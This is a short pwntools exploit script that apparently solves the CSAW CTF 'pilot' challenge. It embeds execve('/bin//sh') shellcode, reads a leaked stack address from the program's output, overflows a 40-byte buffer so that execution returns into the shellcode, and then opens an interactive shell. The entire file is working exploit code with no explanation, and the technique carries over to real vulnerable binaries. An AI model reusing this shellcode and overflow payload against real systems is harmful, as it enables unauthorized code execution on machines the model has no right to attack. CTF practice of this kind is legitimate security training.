from pwn import *
import time
def login(proc):
    proc.sendlineafter('CTF!','username')
    proc.sendline('password')

def find_offset(proc):
    proc.sendline(cyclic(300))
    

def main():
    shell = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56" +\
        "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    p = process('./pilot')
    #p = remote('pwn.chal.csaw.io', 8464) 
    time.sleep(5)
    #find_offset(p)

    for i in range(6):
        p.recvline()
    location = p.recvline()
    address= int(location.split(':')[1].strip(),16)
    print hex(address), location, len(shell)
    p.sendline(shell+'a'*(40-len(shell))+ p64(address))
    p.interactive()

if __name__ == '__main__':
    main()
